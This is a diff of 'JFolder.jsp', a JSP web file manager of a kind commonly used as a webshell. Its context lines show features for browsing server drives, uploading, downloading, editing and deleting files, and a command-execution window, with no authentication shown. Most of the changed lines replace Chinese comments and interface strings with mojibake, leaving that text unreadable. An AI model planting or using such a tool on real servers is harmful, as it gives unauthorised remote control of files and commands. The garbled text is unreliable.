@@ -1,11 +1,11 @@
 <%
 /**
 JFileMan V1.0  windows platform
-@Filename£º JFolder.jsp 
-@Description£º Ò»¸ö¼òµ¥µÄÏµÍ³ÎÄ¼þÄ¿Â¼ÏÔÊ¾³ÌÐò£¬ÀàËÆÓÚ×ÊÔ´¹ÜÀíÆ÷£¬Ìá¹©»ù±¾µÄÎÄ¼þ²Ù×÷£¬²»¹ý¹¦ÄÜÈõ¶àÁË¡£
-@Author£º Steven Cee
-@Email £º cqq1978@Gmail.com
-@Bugs  :  ÏÂÔØÊ±£¬ÖÐÎÄÎÄ¼þÃûÎÞ·¨Õý³£ÏÔÊ¾£»Unix²Ù×÷ÏµÍ³ÉÏ´«
+@Filenameï¿½ï¿½ JFolder.jsp 
+@Descriptionï¿½ï¿½ Ò»ï¿½ï¿½ï¿½òµ¥µï¿½ÏµÍ³ï¿½Ä¼ï¿½Ä¿Â¼ï¿½ï¿½Ê¾ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ô´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½á¹©ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ë¡ï¿½
+@Authorï¿½ï¿½ Steven Cee
+@Email ï¿½ï¿½ cqq1978@Gmail.com
+@Bugs  :  ï¿½ï¿½ï¿½ï¿½Ê±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½Þ·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê¾ï¿½ï¿½Unixï¿½ï¿½ï¿½ï¿½ÏµÍ³ï¿½Ï´ï¿½
 */
 %>
 <%@page errorPage="/"%>
@@ -15,25 +15,25 @@ JFileMan V1.0  windows platform
 private final static int languageNo=1; //Language,0 : Chinese; 1:English
 String strThisFile="JFileMan.jsp";
 String strSeparator = File.separator;
-String[] authorInfo={" <font color=red> Ð´µÄ²»ºÃ£¬½«¾Í×ÅÓÃ°É - - by ´ÈÇÚÇ¿ http://www.topronet.com </font>"," <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>"};
-String[] strFileManage   = {"ÎÄ ¼þ ¹Ü Àí","File Management"};
-String[] strCommand      = {"CMD Ãü Áî","Command Window"};
-String[] strSysProperty  = {"Ïµ Í³ Êô ÐÔ","System Property"};
-String[] strHelp         = {"°ï Öú","Help"};
-String[] strParentFolder = {"ÉÏ¼¶Ä¿Â¼","Parent Folder"};
-String[] strCurrentFolder= {"µ±Ç°Ä¿Â¼","Current Folder"};
-String[] strDrivers      = {"Çý¶¯Æ÷","Drivers"};
-String[] strFileName     = {"ÎÄ¼þÃû³Æ","File Name"};
-String[] strFileSize     = {"ÎÄ¼þ´óÐ¡","File Size"};
-String[] strLastModified = {"×îºóÐÞ¸Ä","Last Modified"};
-String[] strFileOperation= {"ÎÄ¼þ²Ù×÷","Operations"};
-String[] strFileEdit     = {"ÐÞ¸Ä","Edit"};
-String[] strFileDown     = {"ÏÂÔØ","Download"};
-String[] strFileCopy     = {"¸´ÖÆ","Move"};
-String[] strFileDel      = {"É¾³ý","Delete"};
-String[] strExecute      = {"Ö´ÐÐ","Execute"};
-String[] strBack         = {"·µ»Ø","Back"};
-String[] strFileSave     = {"±£´æ","Save"};
+String[] authorInfo={" <font color=red> Ð´ï¿½Ä²ï¿½ï¿½Ã£ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ã°ï¿½ - - by ï¿½ï¿½ï¿½ï¿½Ç¿ http://www.topronet.com </font>"," <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>"};
+String[] strFileManage   = {"ï¿½ï¿½ ï¿½ï¿½ ï¿½ï¿½ ï¿½ï¿½","File Management"};
+String[] strCommand      = {"CMD ï¿½ï¿½ ï¿½ï¿½","Command Window"};
+String[] strSysProperty  = {"Ïµ Í³ ï¿½ï¿½ ï¿½ï¿½","System Property"};
+String[] strHelp         = {"ï¿½ï¿½ ï¿½ï¿½","Help"};
+String[] strParentFolder = {"ï¿½Ï¼ï¿½Ä¿Â¼","Parent Folder"};
+String[] strCurrentFolder= {"ï¿½ï¿½Ç°Ä¿Â¼","Current Folder"};
+String[] strDrivers      = {"ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½","Drivers"};
+String[] strFileName     = {"ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½","File Name"};
+String[] strFileSize     = {"ï¿½Ä¼ï¿½ï¿½ï¿½Ð¡","File Size"};
+String[] strLastModified = {"ï¿½ï¿½ï¿½ï¿½Þ¸ï¿½","Last Modified"};
+String[] strFileOperation= {"ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½","Operations"};
+String[] strFileEdit     = {"ï¿½Þ¸ï¿½","Edit"};
+String[] strFileDown     = {"ï¿½ï¿½ï¿½ï¿½","Download"};
+String[] strFileCopy     = {"ï¿½ï¿½ï¿½ï¿½","Move"};
+String[] strFileDel      = {"É¾ï¿½ï¿½","Delete"};
+String[] strExecute      = {"Ö´ï¿½ï¿½","Execute"};
+String[] strBack         = {"ï¿½ï¿½ï¿½ï¿½","Back"};
+String[] strFileSave     = {"ï¿½ï¿½ï¿½ï¿½","Save"};
 
 public class FileHandler
 {
@@ -363,7 +363,7 @@ String formatPath(String p)
 	}
 String getDrivers()
 /**
-WindowsÏµÍ³ÉÏÈ¡µÃ¿ÉÓÃµÄËùÓÐÂß¼­ÅÌ
+WindowsÏµÍ³ï¿½ï¿½È¡ï¿½Ã¿ï¿½ï¿½Ãµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ß¼ï¿½ï¿½ï¿½
 */
 {
 	StringBuffer sb=new StringBuffer(strDrivers[languageNo] + " : ");
@@ -377,7 +377,7 @@ WindowsÏµÍ³ÉÏÈ¡µÃ¿ÉÓÃµÄËùÓÐÂß¼­ÅÌ
 }
 static String convertFileSize(long filesize)
 {
-	//bug 5.09M ÏÔÊ¾5.9M
+	//bug 5.09M ï¿½ï¿½Ê¾5.9M
 	String strUnit="Bytes";
 	String strAfterComma="";
 	int intDivisor=1;
@@ -428,7 +428,7 @@ if(strAction!=null && strAction.equals("down"))
 	File f=new File(strPath);
 	if(f.length()==0)
 	{
-		sbDown.append("ÎÄ¼þ´óÐ¡Îª 0 ×Ö½Ú£¬¾Í²»ÓÃÏÂÁË°É");
+		sbDown.append("ï¿½Ä¼ï¿½ï¿½ï¿½Ð¡Îª 0 ï¿½Ö½Ú£ï¿½ï¿½Í²ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ë°ï¿½");
 	}
 	else
 	{
@@ -489,8 +489,8 @@ if(strAction!=null && strAction.equals("copy"))
 	sbCopy.append("<input type=hidden name=action value=savecopy >\r\n");
 	sbCopy.append("<input type=hidden name=path value='"+strDir+"' >\r\n");
 	sbCopy.append("<input type=hidden name=file value='"+strFile+"' >\r\n");
-	sbCopy.append("Ô­Ê¼ÎÄ¼þ£º "+strPath+"<p>");
-	sbCopy.append("Ä¿±êÎÄ¼þ£º <input type=text name=file2 size=40 value='"+strDir+"'><p>");
+	sbCopy.append("Ô­Ê¼ï¿½Ä¼ï¿½ï¿½ï¿½ "+strPath+"<p>");
+	sbCopy.append("Ä¿ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ <input type=text name=file2 size=40 value='"+strDir+"'><p>");
 	sbCopy.append("<input type=submit name=save value=' "+strFileCopy[languageNo]+" '> ");
 	sbCopy.append("<input type=button name=goback value=' "+strBack[languageNo]+" ' onclick='history.back(-1);'> <p>&nbsp;\r\n");
 	sbCopy.append("</form>");
@@ -501,14 +501,14 @@ if(strAction!=null && strAction.equals("savecopy"))
 	String strDesFile=request.getParameter("file2");
 	if(strDesFile==null || strDesFile.equals(""))
 	{
-		sbSaveCopy.append("<p><font color=red>Ä¿±êÎÄ¼þ´íÎó¡£</font>");
+		sbSaveCopy.append("<p><font color=red>Ä¿ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½</font>");
 	}
 	else
 	{
 		File f_des=new File(strDesFile);
 		if(f_des.isFile())
 		{
-			sbSaveCopy.append("<p><font color=red>Ä¿±êÎÄ¼þÒÑ´æÔÚ,²»ÄÜ¸´ÖÆ¡£</font>");
+			sbSaveCopy.append("<p><font color=red>Ä¿ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½Ñ´ï¿½ï¿½ï¿½,ï¿½ï¿½ï¿½Ü¸ï¿½ï¿½Æ¡ï¿½</font>");
 		}
 		else
 		{
@@ -534,12 +534,12 @@ if(strAction!=null && strAction.equals("savecopy"))
 			in1.close();
 			out1.close();
 	
-			sbSaveCopy.append("Ô­Ê¼ÎÄ¼þ £º"+strPath+"<p>");
-			sbSaveCopy.append("Ä¿±êÎÄ¼þ £º"+strTmpFile+"<p>");
-			sbSaveCopy.append("<font color=red>¸´ÖÆ³É¹¦£¡</font>");			
+			sbSaveCopy.append("Ô­Ê¼ï¿½Ä¼ï¿½ ï¿½ï¿½"+strPath+"<p>");
+			sbSaveCopy.append("Ä¿ï¿½ï¿½ï¿½Ä¼ï¿½ ï¿½ï¿½"+strTmpFile+"<p>");
+			sbSaveCopy.append("<font color=red>ï¿½ï¿½ï¿½Æ³É¹ï¿½ï¿½ï¿½</font>");			
 		}		
 	}	
-	sbSaveCopy.append("<p><input type=button name=saveCopyBack onclick='history.back(-2);' value=·µ»Ø>");
+	sbSaveCopy.append("<p><input type=button name=saveCopyBack onclick='history.back(-2);' value=ï¿½ï¿½ï¿½ï¿½>");
 }
 if(strAction!=null && strAction.equals("newFile"))
 {
@@ -559,13 +559,13 @@ if(strAction!=null && strAction.equals("newFile"))
 	{		
 			File f_new=new File(strF);			
 			if(strType.equals("File") && !f_new.createNewFile())
-				sbNewFile.append(strF+" ÎÄ¼þ´´½¨Ê§°Ü");
+				sbNewFile.append(strF+" ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½Ê§ï¿½ï¿½");
 			if(strType.equals("Dir") && !f_new.mkdirs())
-				sbNewFile.append(strF+" Ä¿Â¼´´½¨Ê§°Ü");
+				sbNewFile.append(strF+" Ä¿Â¼ï¿½ï¿½ï¿½ï¿½Ê§ï¿½ï¿½");
 	}
 	else
 	{
-		sbNewFile.append("<p><font color=red>½¨Á¢ÎÄ¼þ»òÄ¿Â¼³ö´í¡£</font>");
+		sbNewFile.append("<p><font color=red>ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½Ä¿Â¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</font>");
 	}
 }
 
@@ -661,7 +661,7 @@ display:none;
 
 var initialtab=[<%=tabID%>, "menu<%=tabID%>"]
 
-////////Stop editting////////////////
+////////Stop editing////////////////
 
 function cascadedstyle(el, cssproperty, csspropertyNS){
 if (el.currentStyle)
@@ -732,7 +732,7 @@ function doForm(action,path,file,cmd,tab,content)
 	document.frmCqq.content.value=content;
 	if(action=="del")
 	{
-		if(confirm("È·¶¨ÒªÉ¾³ýÎÄ¼þ "+file+" Âð£¿"))
+		if(confirm("È·ï¿½ï¿½ÒªÉ¾ï¿½ï¿½ï¿½Ä¼ï¿½ "+file+" ï¿½ï¿½"))
 		document.frmCqq.submit();
 	}
 	else
@@ -824,7 +824,7 @@ try
 }
 catch(Exception e)
 {
-	out.println("<font color=red>²Ù×÷Ê§°Ü£º "+e.toString()+"</font>");
+	out.println("<font color=red>ï¿½ï¿½ï¿½ï¿½Ê§ï¿½Ü£ï¿½ "+e.toString()+"</font>");
 }
 %>
 
@@ -833,7 +833,7 @@ catch(Exception e)
 
 <div id="menu3" class="tabcontent">
 <br> 
-<br> &nbsp;&nbsp; Î´Íê³É<%=strOS%>
+<br> &nbsp;&nbsp; Î´ï¿½ï¿½ï¿½<%=strOS%>
 <br> <%
 //Properties prop = new Properties(System.getProperties());  
 //prop.list(out);
@@ -845,20 +845,20 @@ catch(Exception e)
 
 <div id="menu4" class="tabcontent">
 <br>
-<p>Ò»¡¢¹¦ÄÜËµÃ÷</p>
-<p>&nbsp;&nbsp;&nbsp; jsp °æ±¾µÄÎÄ¼þ¹ÜÀíÆ÷£¬Í¨¹ý¸Ã³ÌÐò¿ÉÒÔÔ¶³Ì¹ÜÀí·þÎñÆ÷ÉÏµÄÎÄ¼þÏµÍ³£¬Äú¿ÉÒÔÐÂ½¨¡¢ÐÞ¸Ä¡¢</p>
-<p>É¾³ý¡¢ÏÂÔØÎÄ¼þºÍÄ¿Â¼¡£¶ÔÓÚwindowsÏµÍ³£¬»¹Ìá¹©ÁËÃüÁîÐÐ´°¿ÚµÄ¹¦ÄÜ£¬¿ÉÒÔÔËÐÐÒ»Ð©³ÌÐò£¬ÀàËÆ</p>
-<p>ÓëwindowsµÄcmd¡£</p>
+<p>Ò»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ëµï¿½ï¿½</p>
+<p>&nbsp;&nbsp;&nbsp; jsp ï¿½æ±¾ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í¨ï¿½ï¿½ï¿½Ã³ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ô¶ï¿½Ì¹ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ïµï¿½ï¿½Ä¼ï¿½ÏµÍ³ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Â½ï¿½ï¿½ï¿½ï¿½Þ¸Ä¡ï¿½</p>
+<p>É¾ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½Ä¿Â¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½windowsÏµÍ³ï¿½ï¿½ï¿½ï¿½ï¿½á¹©ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð´ï¿½ï¿½ÚµÄ¹ï¿½ï¿½Ü£ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ò»Ð©ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</p>
+<p>ï¿½ï¿½windowsï¿½ï¿½cmdï¿½ï¿½</p>
 <p>&nbsp;</p>
-<p>¶þ¡¢²âÊÔ</p>
-<p>&nbsp;&nbsp;&nbsp;<b>Çë´ó¼ÒÔÚÊ¹ÓÃ¹ý³ÌÖÐ£¬ÓÐÈÎºÎÎÊÌâ£¬Òâ¼û»òÕß½¨Òé¶¼¿ÉÒÔ¸øÎÒÁôÑÔ£¬ÒÔ±ãÊ¹Õâ¸ö³ÌÐò¸ü¼ÓÍêÉÆºÍÎÈ¶¨£¬<p>
-ÁôÑÔµØÖ·Îª£º<a href="http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx" target="_blank">http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx</a></b>
+<p>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</p>
+<p>&nbsp;&nbsp;&nbsp;<b>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê¹ï¿½Ã¹ï¿½ï¿½ï¿½ï¿½Ð£ï¿½ï¿½ï¿½ï¿½Îºï¿½ï¿½ï¿½ï¿½â£¬ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ß½ï¿½ï¿½é¶¼ï¿½ï¿½ï¿½Ô¸ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ô£ï¿½ï¿½Ô±ï¿½Ê¹ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Æºï¿½ï¿½È¶ï¿½ï¿½ï¿½<p>
+ï¿½ï¿½ï¿½Ôµï¿½Ö·Îªï¿½ï¿½<a href="http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx" target="_blank">http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx</a></b>
 <p>&nbsp;</p>
-<p>Èý¡¢¸üÐÂ¼ÇÂ¼</p>
-<p>&nbsp;&nbsp;&nbsp; 2004.11.29&nbsp; V1.0²âÊÔ°æ·¢²¼£¬ÐÞÕýÁËLinuxÏµÍ³ÉÏµÄÒ»Ð©ÎÊÌâ£¬ÔÚLinuxÏµÍ³ÉÏÒ²¿ÉÒÔÊ¹ÓÃ¡£</p>
-<p>&nbsp;&nbsp;&nbsp; 2004.11.15&nbsp; V0.9²âÊÔ°æ·¢²¼£¬Ôö¼ÓÁËÒ»Ð©»ù±¾µÄ¹¦ÄÜ£¬ÎÄ¼þ±à¼­¡¢¸´ÖÆ¡¢É¾³ý¡¢ÏÂÔØ¡¢ÉÏ´«ÒÔ¼°ÐÂ½¨ÎÄ¼þÄ¿Â¼¹¦ÄÜ</p>
-<p>&nbsp;&nbsp;&nbsp; 2004.10.27&nbsp; ÔÝÊ±¶¨Îª0.6°æ°É£¬ Ìá¹©ÁËÄ¿Â¼ÎÄ¼þä¯ÀÀ¹¦ÄÜ ºÍ cmd¹¦ÄÜ</p>
-<p>&nbsp;&nbsp;&nbsp; 2004.09.20&nbsp; µÚÒ»¸öjsp&nbsp;³ÌÐò¾ÍÊÇÕâ¸ö¼òµ¥µÄÏÔÊ¾Ä¿Â¼ÎÄ¼þµÄÐ¡³ÌÐò</p>
+<p>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Â¼ï¿½Â¼</p>
+<p>&nbsp;&nbsp;&nbsp; 2004.11.29&nbsp; V1.0ï¿½ï¿½ï¿½Ô°æ·¢ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½LinuxÏµÍ³ï¿½Ïµï¿½Ò»Ð©ï¿½ï¿½ï¿½â£¬ï¿½ï¿½LinuxÏµÍ³ï¿½ï¿½Ò²ï¿½ï¿½ï¿½ï¿½Ê¹ï¿½Ã¡ï¿½</p>
+<p>&nbsp;&nbsp;&nbsp; 2004.11.15&nbsp; V0.9ï¿½ï¿½ï¿½Ô°æ·¢ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ò»Ð©ï¿½ï¿½ï¿½ï¿½ï¿½Ä¹ï¿½ï¿½Ü£ï¿½ï¿½Ä¼ï¿½ï¿½à¼­ï¿½ï¿½ï¿½ï¿½ï¿½Æ¡ï¿½É¾ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ø¡ï¿½ï¿½Ï´ï¿½ï¿½Ô¼ï¿½ï¿½Â½ï¿½ï¿½Ä¼ï¿½Ä¿Â¼ï¿½ï¿½ï¿½ï¿½</p>
+<p>&nbsp;&nbsp;&nbsp; 2004.10.27&nbsp; ï¿½ï¿½Ê±ï¿½ï¿½Îª0.6ï¿½ï¿½É£ï¿½ ï¿½á¹©ï¿½ï¿½Ä¿Â¼ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ï¿½ cmdï¿½ï¿½ï¿½ï¿½</p>
+<p>&nbsp;&nbsp;&nbsp; 2004.09.20&nbsp; ï¿½ï¿½Ò»ï¿½ï¿½jsp&nbsp;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½òµ¥µï¿½ï¿½ï¿½Ê¾Ä¿Â¼ï¿½Ä¼ï¿½ï¿½ï¿½Ð¡ï¿½ï¿½ï¿½ï¿½</p>
 <p>&nbsp;</p>
 <p>&nbsp;</p>
 </div>
@@ -866,7 +866,7 @@ catch(Exception e)
 
 <div id="menu1" class="tabcontent">
 <%
-out.println("<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolordark=#FFFFFF><tr><td width='30%'>"+strCurrentFolder[languageNo]+"£º <b>"+strDir+"</b></td><td>" + getDrivers() + "</td></tr></table><br>\r\n");
+out.println("<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolordark=#FFFFFF><tr><td width='30%'>"+strCurrentFolder[languageNo]+"ï¿½ï¿½ <b>"+strDir+"</b></td><td>" + getDrivers() + "</td></tr></table><br>\r\n");
 %>
 <table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
        
@@ -913,7 +913,7 @@ out.println("<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cell
             <%=sbFile%>
              <!-- <tr align="center"> 
                 <td colspan="4"><br>
-                  ×Ü¼ÆÎÄ¼þ¸öÊý£º<font color="#FF0000">30</font> £¬´óÐ¡£º<font color="#FF0000">664.9</font> 
+                  ï¿½Ü¼ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<font color="#FF0000">30</font> ï¿½ï¿½ï¿½ï¿½Ð¡ï¿½ï¿½<font color="#FF0000">664.9</font> 
                   KB </td>
               </tr>
 			 -->
@@ -939,8 +939,8 @@ out.println("<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cell
 	strDir = strDir + strSeparator;
 	%>
 	<input type="text" name="fileName" size=36 value="<%=strDir%>">
-	<input type="submit" name="btnNewFile" value="ÐÂ½¨ÎÄ¼þ" onclick="frmMake.submit()" > 
-	<input type="submit" name="btnNewDir" value="ÐÂ½¨Ä¿Â¼"  onclick="frmMake.submit()" > 
+	<input type="submit" name="btnNewFile" value="ï¿½Â½ï¿½ï¿½Ä¼ï¿½" onclick="frmMake.submit()" > 
+	<input type="submit" name="btnNewDir" value="ï¿½Â½ï¿½Ä¿Â¼"  onclick="frmMake.submit()" > 
 	</form>		
 	<form name="frmUpload" enctype="multipart/form-data" action="" method="post">
 	<input type="hidden" name="action" value="upload">
@@ -950,7 +950,7 @@ out.println("<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cell
 	<input type="hidden" name="tabID" value="1">
 	<input type="hidden" name="content" value="">
 	<input type="file" name="cqqUploadFile" size="36">
-	<input type="submit" name="submit" value="ÉÏ´«">
+	<input type="submit" name="submit" value="ï¿½Ï´ï¿½">
 	</td></tr></form>
       </table>
 </div>
